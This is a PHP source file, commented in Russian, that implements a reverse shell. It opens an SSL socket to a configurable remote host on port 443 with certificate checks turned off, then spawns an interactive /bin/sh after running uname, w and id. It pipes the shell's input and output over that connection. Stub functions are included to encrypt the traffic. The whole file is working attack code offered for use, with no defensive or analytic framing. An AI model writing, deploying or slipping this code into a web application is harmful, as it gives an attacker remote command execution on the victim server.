<?php
$host = '127.0.0.1'; // Замените на IP-адрес сервера
$port = 443; // HTTPS порт для SSL соединения
$timeout = 30; // Таймаут для сокета
// Функция обеспечивающая шифрование трафика
function encryptData($data, $key)
{
    // Это место для вашего алгоритма шифрования
    return $data; // Здесь просто заглушка
}
// Функция дешифрования трафика
function decryptData($data, $key)
{
    // Это место для вашего алгоритма дешифрования
    return $data; // Здесь просто заглушка
}
// Создание сокета с шифрованием SSL
$context = stream_context_create([
    'ssl' => [
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true
    ]
]);
// Устанавливаем соединение через сокет
$sock = stream_socket_client(
    "ssl://{$host}:{$port}",
    $errno,
    $errstr,
    $timeout,
    STREAM_CLIENT_CONNECT,
    $context
);
// Проверяем, создан ли сокет
if (!$sock) {
    echo "Не удалось создать сокет: $errstr ($errno)\n";
    exit(1);
}
// Процесс оболочки
$shell = 'uname -a; w; id; /bin/sh -i';
$process = proc_open($shell, [
    0 => ['pipe', 'r'], // STDIN
    1 => ['pipe', 'w'], // STDOUT
    2 => ['pipe', 'w']  // STDERR
], $pipes);
// Устанавливаем неблокирующий режим
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
echo "Реверс-шелл подключен к {$host}:{$port}\n";
while (1) {
    // Проверка соединения
    if (feof($sock)) {
        echo "Соединение прервано\n";
        break;
    }
    // Проверка процесса
    if (feof($pipes[1])) {
        echo "Процесс завершил работу\n";
        break;
    }
    $read_a = [$sock, $pipes[1], $pipes[2]];
    $num_changed_streams = stream_select($read_a, $write_a, $error_a, null);
    foreach ($read_a as $read) {
        if ($read == $sock) {
            $input = fread($sock, 4096);
            if ($input) {
                $decrypted = decryptData($input, 'secret_key'); // Пример использования функции дешифрования
                fwrite($pipes[0], $decrypted);
            }
        } elseif (in_array($read, $pipes)) {
            $input = fread($read, 4096);
            if ($input) {
                $encrypted = encryptData($input, 'secret_key'); // Пример использования функции шифрования
                fwrite($sock, $encrypted);
            }
        }
    }
}
fclose($sock);
foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($process);
?>
